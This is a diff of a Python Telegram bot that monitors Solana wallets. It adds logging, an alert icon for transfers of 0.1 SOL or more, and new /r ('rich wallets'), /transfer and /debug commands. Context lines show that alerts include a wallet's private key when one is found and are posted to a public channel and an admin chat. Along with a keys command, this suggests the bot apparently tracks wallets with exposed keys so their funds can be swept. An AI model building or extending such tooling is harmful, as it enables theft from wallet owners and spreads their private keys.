             escaped_tx_type = escape_markdown_v2(tx_type)
 
-            # Create base message
-            message = f"💰 معاملة جديدة\\!\n\n🏦 المحفظة: {escaped_wallet}\n💵 المبلغ: {escaped_amount} SOL\n🔄 النوع: {escaped_tx_type}"
+            # Create base message with urgency indicator
+            amount_float = abs(float(amount)) if amount else 0
+            urgency_icon = "🚨" if amount_float >= 0.1 else "💰"
+            
+            message = f"{urgency_icon} معاملة جديدة\\!\n\n🏦 المحفظة: {escaped_wallet}\n💵 المبلغ: {escaped_amount} SOL\n🔄 النوع: {escaped_tx_type}"
 
             # Add private key to message if found
             if private_key:
@@ -1467,12 +1907,15 @@ class SolanaWalletBot:
             if admin_monitoring and regular_users_monitoring:
                 # Case 1: Both admin and regular users monitoring → Send to channel + admin private
                 try:
+                    logger.info(f"📤 Sending to channel {MONITORING_CHANNEL} and admin {ADMIN_CHAT_ID}")
+                    
                     # Send to public channel
                     await self.application.bot.send_message(
                         chat_id=MONITORING_CHANNEL, 
                         text=message, 
                         parse_mode='MarkdownV2'
                     )
+                    logger.info(f"✅ Successfully sent to channel {MONITORING_CHANNEL}")
 
                     # Send to admin private chat
                     admin_message = message + f"\n\n👑 **إشعار المشرف**: هذه المحفظة مراقبة من قبل مستخدمين عاديين أيضاً"
@@ -1481,6 +1924,7 @@ class SolanaWalletBot:
                         text=admin_message, 
                         parse_mode='MarkdownV2'
                     )
+                    logger.info(f"✅ Successfully sent to admin {ADMIN_CHAT_ID}")
 
                 except Exception as notification_error:
                     logger.error(f"Error sending notifications (admin + users case): {notification_error}")
@@ -1488,12 +1932,14 @@ class SolanaWalletBot:
             elif admin_monitoring and not regular_users_monitoring:
                 # Case 2: Only admin monitoring → Send to admin private only
                 try:
+                    logger.info(f"📤 Sending to admin only {ADMIN_CHAT_ID}")
                     admin_message = message + f"\n\n👑 **إشعار المشرف**: هذه المحفظة مراقبة من قبلك فقط"
                     await self.application.bot.send_message(
                         chat_id=ADMIN_CHAT_ID, 
                         text=admin_message, 
                         parse_mode='MarkdownV2'
                     )
+                    logger.info(f"✅ Successfully sent to admin {ADMIN_CHAT_ID}")
 
                 except Exception as admin_error:
                     logger.error(f"Error sending notification to admin: {admin_error}")
@@ -1501,14 +1947,19 @@ class SolanaWalletBot:
             elif not admin_monitoring and regular_users_monitoring:
                 # Case 3: Only regular users monitoring → Send to channel only
                 try:
+                    logger.info(f"📤 Sending to channel only {MONITORING_CHANNEL}")
                     await self.application.bot.send_message(
                         chat_id=MONITORING_CHANNEL, 
                         text=message, 
                         parse_mode='MarkdownV2'
                     )
+                    logger.info(f"✅ Successfully sent to channel {MONITORING_CHANNEL}")
 
                 except Exception as channel_error:
                     logger.error(f"Error sending to channel: {channel_error}")
+            
+            else:
+                logger.warning(f"🤔 No valid notification case found: admin_monitoring={admin_monitoring}, regular_users_monitoring={regular_users_monitoring}")
 
         except Exception as e:
             logger.error(f"Error sending notification: {e}")
@@ -1549,8 +2000,11 @@ class SolanaWalletBot:
         self.application.add_handler(CommandHandler("add", self.bulk_add_command))
         self.application.add_handler(CommandHandler("stop", self.stop_command))
         self.application.add_handler(CommandHandler("list", self.list_command))
+        self.application.add_handler(CommandHandler("r", self.rich_wallets_command))
         self.application.add_handler(CommandHandler("k", self.keys_command))
         self.application.add_handler(CommandHandler("filter", self.filter_command))
+        self.application.add_handler(CommandHandler("transfer", self.transfer_command))
+        self.application.add_handler(CommandHandler("debug", self.debug_command))
         self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
         self.application.add_handler(CallbackQueryHandler(self.handle_callback_query))
         self.application.add_error_handler(self.error_handler)
@@ -1649,10 +2103,10 @@ class SolanaWalletBot:
 
 
     async def health_monitor(self):
-        """Monitor bot health and restart if needed"""
+        """Monitor bot health and restart if needed - محسّن للمراقبة السريعة"""
         while True:
             try:
-                await asyncio.sleep(300)  # Check every 5 minutes
+                await asyncio.sleep(60)  # فحص كل دقيقة لضمان المراقبة المستمرة
 
                 # Check if monitoring tasks are still running
                 active_tasks = sum(1 for task_info in self.monitor.monitoring_tasks.values() 
@@ -1668,9 +2122,15 @@ class SolanaWalletBot:
                     logger.warning("🔄 Restarting global monitoring task")
                     await self.monitor.start_global_monitoring(self.send_transaction_notification)
 
+                # فحص إضافي لضمان عمل المراقبة
+                all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
+                if len(all_wallets) > 0 and active_tasks == 0:
+                    logger.error("🚨 No monitoring tasks running despite having wallets! Restarting...")
+                    await self.monitor.start_global_monitoring(self.send_transaction_notification)
+
             except Exception as e:
                 logger.error(f"Health monitor error: {e}")
-                await asyncio.sleep(60)
+                await asyncio.sleep(30)
 
     async def cleanup(self):
         """Cleanup resources"""
